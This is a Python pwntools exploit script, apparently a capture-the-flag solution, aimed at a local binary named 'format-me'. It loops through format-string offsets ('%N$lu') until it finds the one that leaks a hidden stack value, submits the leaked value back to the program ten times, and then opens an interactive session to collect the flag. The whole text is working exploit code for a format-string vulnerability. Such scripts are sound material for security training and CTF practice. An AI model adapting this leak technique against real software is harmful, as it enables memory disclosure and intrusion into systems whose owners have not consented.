#!/usr/bin/env python3
from pwn import *

# Optional: see I/O
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

BIN = "./format-me"
exe = ELF(BIN)

def find_index():
    """Auto-calibrate the correct %N$lu slot that equals the hidden code."""
    for i in range(1, 60):
        p = process(BIN)
        p.recvuntil(b"Recipient? ")
        p.sendline(f"%{i}$lu".encode())

        line = p.recvuntil(b"...\n", drop=False)
        # e.g. b"Sending to 7288557943962863260...\n"
        leak = line.split(b"Sending to ", 1)[1].split(b"...", 1)[0].strip()

        p.recvuntil(b"Guess? ")
        p.sendline(leak)
        out = p.recvall(timeout=0.5) or b""
        p.close()
        if b"Correct code! Package sent." in out:
            print(f"[+] Using index: {i}")
            return i
    raise RuntimeError("No working %N$lu index found (1..59).")

def main():
    idx = find_index()
    r = process([exe.path])

    for _ in range(10):
        r.recvuntil(b"Recipient? ")
        r.sendline(f"%{idx}$lu".encode())

        line = r.recvuntil(b"...\n", drop=False)
        val  = line.split(b"Sending to ", 1)[1].split(b"...", 1)[0].strip()

        r.recvuntil(b"Guess? ")
        r.sendline(val)
        r.recvuntil(b"Correct code! Package sent.")

    r.recvuntil(b"Here's your flag: ")
    r.interactive()

if __name__ == "__main__":
    main()
